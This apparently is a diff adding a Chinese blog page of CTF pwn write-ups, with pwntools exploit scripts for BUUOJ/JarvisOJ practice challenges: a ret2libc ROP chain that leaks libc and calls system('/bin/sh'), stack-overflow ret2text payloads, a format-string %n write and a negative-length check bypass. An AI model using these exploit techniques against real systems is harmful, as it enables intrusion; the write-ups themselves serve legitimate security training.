+</span></span><span style="display:flex;"><span>read_got <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;read&#39;</span>]
+</span></span><span style="display:flex;"><span>main <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;main&#39;</span>]
+</span></span><span style="display:flex;"><span>format_str <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x400770</span>  
+</span></span><span style="display:flex;"><span>rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0400733</span>
+</span></span><span style="display:flex;"><span>rsi<span style="color:#f92672">=</span><span style="color:#ae81ff">0x400731</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">0x20</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">+</span> p64(rdi) <span style="color:#f92672">+</span> p64(format_str) <span style="color:#f92672">+</span> p64(rsi) <span style="color:#f92672">+</span> p64(read_got) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(printf_plt) <span style="color:#f92672">+</span> p64(main)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#32位用这个</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># print(p.recvuntil(&#39;\n&#39;))</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># read_addr = u32(p.recv(4))</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#64位用这个</span>
+</span></span><span style="display:flex;"><span>read_addr <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x7f</span><span style="color:#e6db74">&#39;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">6</span>:]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
+</span></span><span style="display:flex;"><span>print(hex(read_addr))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>libc_base <span style="color:#f92672">=</span> read_addr <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;read&#34;</span>]
+</span></span><span style="display:flex;"><span>system_addr <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;system&#34;</span>]
+</span></span><span style="display:flex;"><span>str_bin_sh <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh&#39;</span>)<span style="color:#f92672">.</span>__next__()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># libc = LibcSearcher(&#39;printf&#39;, printf_addr)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># libc_base = printf_addr - libc.dump(&#34;printf&#34;)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># system_addr = libc_base + libc.dump(&#34;system&#34;)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># str_bin_sh = libc_base + libc.dump(&#34;str_bin_sh&#34;)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">0x20</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">+</span> p64(rdi) <span style="color:#f92672">+</span> p64(str_bin_sh) <span style="color:#f92672">+</span> p64(system_addr)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><h2 id="202353-jarvisoj_tell_me_something">2023.5.3 jarvisoj_tell_me_something</h2>
+<p>这个题有点意思，其实思路就是普通栈溢出 ret2text，但是值得注意的是这个题的栈帧中没有 ebp。
+<img src="https://gitee.com/juhuahua/chart-bed/raw/master/20230503152831.png" alt="image.png">
+右边是正常函数，左边是这个题的主函数。这个题调整了 rsp 后就直接 ret 了，没有 pop rbp（也就是说 leave 指令不完整）
+所以我们在溢出的时候就不要算上 rbp 的 8 个字节了，只覆盖 88 个字节就够了。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;node4.buuoj.cn&#34;</span>, <span style="color:#ae81ff">28091</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>flag_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x400620</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x88</span> <span style="color:#f92672">+</span> p64(flag_addr)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><h2 id="202329-jarvisoj-fm">2023.2.9 JarvisOJ fm</h2>
+<p>^6d185f</p>
+<p><img src="https://gitee.com/juhuahua/chart-bed/raw/master/20230209214552.png" alt="image.png">
+明显的格式化字符串漏洞，进行一个任意地址内存的覆盖。我们尝试将 x 的值改成 4。
+首先来捋一下思路，格式化字符串漏洞的利用总是很绕。</p>
+<ol>
+<li>首先我们想要把 4 写到 addr_of_x，&mdash;-&gt;使用%n，%n 可以将输出的字符个数写入指定的参数指向的地址处</li>
+<li>然后我们需要知道第几个参数存储了我们写入的格式字符串&mdash;-&gt;在 gdb 中用 a*n 来找。</li>
+</ol>
+<p>那么来构造输入的格式化字符串
+<code>0x0804A02C%11$n</code>
+前面的是 x 的地址（IDA 看出来的），11 是格式化字符串存储位置（gdb 看出来的）
+Exp:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;node4.buuoj.cn&#34;</span>, <span style="color:#ae81ff">29563</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>addr_of_x <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0804A02C</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> p32(addr_of_x) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%11$n&#34;</span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p>注意最后不需要 recv。</p>
+<h2 id="2023131-bjdctf_2020_babystack2">2023.1.31 bjdctf_2020_babystack2</h2>
+<ul>
+<li>关键点：-1 绕过长度检查</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#start</span>
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;node4.buuoj.cn&#34;</span>,<span style="color:#ae81ff">27324</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># r = process(&#34;../buu/bjdctf_2020_babystack2&#34;)</span>
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;../buu/bjdctf_2020_babystack2&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#params</span>
+</span></span><span style="display:flex;"><span>backdoor_addr <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;backdoor&#39;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#attack</span>
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>recv()
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;-1&#34;</span>)
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>recv()
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;M&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">0x10</span><span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">+</span> p64(backdoor_addr)
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div>
+		</section>
+
+		<div class="post-tags">
+			
+			
+			<nav class="nav tags">
+				<ul class="tags">
+					
+					<li><a href="/tags/pwn%E9%A2%98%E8%A7%A3">PWN题解</a></li>
+					
+				</ul>
+			</nav>
+			
+			
+		</div>
+		</article>
+</main>
+<footer>
+  <div style="display:flex"></div>
+  <div class="footer-info">
+    2023  © Athul |  <a
+      href="https://github.com/athul/archie">Archie Theme</a> | Built with <a href="https://gohugo.io">Hugo</a>
+  </div>
+</footer>
+
+
+</div>
+    </body>
+</html>
